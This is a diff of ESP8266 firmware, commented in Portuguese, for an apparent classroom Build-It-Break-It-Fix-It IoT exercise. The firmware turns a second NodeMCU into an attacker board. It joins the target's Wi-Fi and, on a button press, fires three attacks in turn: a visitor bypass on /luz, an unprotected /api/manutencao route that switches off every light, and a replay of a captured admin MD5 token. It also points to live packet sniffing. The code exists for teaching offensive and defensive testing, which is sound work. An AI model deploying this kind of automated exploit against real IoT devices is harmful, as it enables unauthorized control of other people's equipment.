@@ -1,18 +1,15 @@
 /*
  * ============================================================================
- * PROJETO BIBIFI IoT - PLACA ATACANTE (RED TEAM BOX EM UMA 2ª NODEMCU)
+ * Projeto BIBIFI IoT - Placa Atacante (Red Team em uma 2a NodeMCU)
  * ============================================================================
- * Como vocês têm várias placas NodeMCU ESP8266, você pode gravar este código
- * em uma SEGUNDA placa (a "Placa Hacker" do seu grupo)!
- *
- * O que ela faz (sem precisar de nenhum fio externo!):
- *   1. Conecta automaticamente na rede Wi-Fi "SmartHome_IoT" da placa dos colegas.
- *   2. Ao apertar o botão físico "FLASH" (que já vem soldado na NodeMCU):
- *      - Primeiro tenta o BREAK 1 (Exploit de Fluxo de Controle e Rota Esquecida);
- *      - Se os colegas já tiverem feito o Fix It (retornar 403), ela
- *        automaticamente escuta/captura o último pacote autenticado do Admin
- *        na rede e dispara o BREAK 2 (REPLAY ATTACK), apagando o LED Azul
- *        dos colegas na hora!
+ * Opcional para usar uma segunda NodeMCU ESP8266 como atacante de bancada
+ * (sem componentes externos):
+ *   1. Conecta automaticamente na rede Wi-Fi "SmartHome_IoT" do alvo.
+ *   2. Ao apertar o botão físico "FLASH" (GPIO 0):
+ *      - Tenta o Break 1A (fluxo de controle em /luz) e Break 1B (/api/manutencao);
+ *      - Se o alvo já estiver corrigido, lê um token capturado via Monitor Serial
+ *        (sniffing feito no notebook com tcpdump/Wireshark) e dispara o Break 2
+ *        (Replay Attack) para apagar a luz principal.
  * ============================================================================
  */
 
@@ -35,65 +32,45 @@ void piscarLedInterno(int vezes, int intervaloMs) {
   }
 }
 
-// Extrai o valor de uma chave simples em uma string JSON
-String extrairCampoJson(String json, String chave) {
-  String padrao = "\"" + chave + "\":\"";
-  int ini = json.indexOf(padrao);
-  if (ini == -1) return "";
-  ini += padrao.length();
-  int fim = json.indexOf("\"", ini);
-  if (fim == -1) return "";
-  return json.substring(ini, fim);
-}
-
 void executarSequenciaDeAtaque() {
   WiFiClient client;
   HTTPClient http;
 
-  Serial.println("\n====================================================");
-  Serial.println("[RED TEAM NODEMCU] Iniciando sequencia de ataque...");
+  Serial.println("\n----------------------------------------------------");
+  Serial.println("[Red Team NodeMCU] Iniciando sequência de ataque...");
   piscarLedInterno(2, 100);
 
-  // --------------------------------------------------------------------------
-  // TENTATIVA 1: BREAK 1A (Explorar Mistake de falta de return na rota /luz)
-  // --------------------------------------------------------------------------
-  Serial.println("[1/3] Testando Break 1A (Bypass de visitante na rota /luz)...");
+  // Tentativa 1: Break 1A (falha de fluxo de controle em /luz)
+  Serial.println("[1/3] Testando Break 1A (bypass de visitante na rota /luz)...");
   http.begin(client, ALVO_HOST + "/luz?acao=OFF&user=visitante");
-  int code1A = http.GET();
+  http.GET();
   http.end();
 
-  // Verifica no /status se a luz apagou
   http.begin(client, ALVO_HOST + "/status");
-  int codeStatus = http.GET();
+  http.GET();
   String statusJson = http.getString();
   http.end();
 
   if (statusJson.indexOf("\"luz_acesa\":false") != -1) {
-    Serial.println("[SUCESSO - BREAK 1A] Luz apagada explorando falha de fluxo (Mistake)!");
+    Serial.println("[Sucesso - Break 1A] Luz apagada explorando falha de fluxo (Mistake).");
     piscarLedInterno(5, 80);
     return;
   }
 
-  // --------------------------------------------------------------------------
-  // TENTATIVA 2: BREAK 1B (Explorar No Implementation na rota /api/manutencao)
-  // --------------------------------------------------------------------------
-  Serial.println("[2/3] Break 1A bloqueado! Testando Break 1B (Rota /api/manutencao)...");
+  // Tentativa 2: Break 1B (rota /api/manutencao sem proteção)
+  Serial.println("[2/3] Break 1A bloqueado. Testando Break 1B (/api/manutencao)...");
   http.begin(client, ALVO_HOST + "/api/manutencao?cmd=apagar_tudo");
   int code1B = http.GET();
   http.end();
 
   if (code1B == 200) {
-    Serial.println("[SUCESSO - BREAK 1B] Luz apagada pela rota de manutencao esquecida!");
+    Serial.println("[Sucesso - Break 1B] Luz apagada pela rota de manutenção.");
     piscarLedInterno(5, 80);
     return;
   }
 
-  // --------------------------------------------------------------------------
-  // TENTATIVA 3: BREAK 2 (REPLAY ATTACK - Replicação do Comando do Admin!)
-  // Cole aqui o token capturado no sniffing (tcpdump/Wireshark/painel Python)
-  // ou envie o token pelo Monitor Serial antes de apertar FLASH.
-  // --------------------------------------------------------------------------
-  Serial.println("[3/3] Alvo ja recebeu o Fix! Executando REPLAY ATTACK...");
+  // Tentativa 3: Break 2 (Replay Attack usando token enviado pelo Monitor Serial)
+  Serial.println("[3/3] Alvo corrigido. Executando Replay Attack...");
   String tokenCapturado = "";
   if (Serial.available()) {
     tokenCapturado = Serial.readStringUntil('\n');
@@ -101,8 +78,8 @@ void executarSequenciaDeAtaque() {
   }
 
   if (tokenCapturado.length() > 0) {
-    Serial.println("      Token MD5 capturado: " + tokenCapturado);
-    Serial.println("      Replicando comando OFF com o Token capturado...");
+    Serial.println("      Token MD5 recebido: " + tokenCapturado);
+    Serial.println("      Replicando comando OFF com o token capturado...");
 
     http.begin(client, ALVO_HOST + "/luz?acao=OFF&user=admin&token=" + tokenCapturado);
     int codeReplay = http.GET();
@@ -110,13 +87,13 @@ void executarSequenciaDeAtaque() {
     http.end();
 
     if (codeReplay == 200) {
-      Serial.println("[SUCESSO - BREAK 2 REPLAY ATTACK] Luz Principal APAGADA via replicacao!");
+      Serial.println("[Sucesso - Break 2] Luz apagada via Replay Attack.");
       piscarLedInterno(8, 60);
     } else {
-      Serial.println("[BLOQUEADO] O alvo rejeitou o Replay Attack (Nonce ativo): " + respReplay);
+      Serial.println("[Bloqueado] O alvo rejeitou o Replay Attack (Nonce ativo): " + respReplay);
     }
   } else {
-    Serial.println("[AVISO] Para Replay via 2a placa, envie o token capturado pelo Monitor Serial");
+    Serial.println("[Aviso] Para Replay via 2a placa, envie o token capturado pelo Monitor Serial");
     Serial.println("        (ou use 'sudo python3 ataques/painel_ataque_grupo.py' para sniffar ao vivo).");
   }
 }
@@ -127,7 +104,7 @@ void setup() {
   pinMode(PINO_BOTAO_FLASH, INPUT_PULLUP);
   digitalWrite(LED_BUILTIN, HIGH);
 
-  Serial.println("\n[RED TEAM] Conectando na rede SmartHome_IoT do alvo...");
+  Serial.println("\n[Red Team] Conectando na rede SmartHome_IoT do alvo...");
   WiFi.mode(WIFI_STA);
   WiFi.begin(ALVO_SSID, ALVO_SENHA);
 
@@ -136,8 +113,8 @@ void setup() {
     Serial.print(".");
   }
 
-  Serial.println("\n[CONECTADO] Placa Atacante pronta!");
-  Serial.println(">>> Aperte o botao FLASH na NodeMCU para disparar o ataque! <<<");
+  Serial.println("\n[Conectado] Placa atacante pronta.");
+  Serial.println("Aperte o botão FLASH na NodeMCU para disparar o ataque.");
   digitalWrite(LED_BUILTIN, LOW); // LED aceso = conectado e pronto para atacar
 }
 
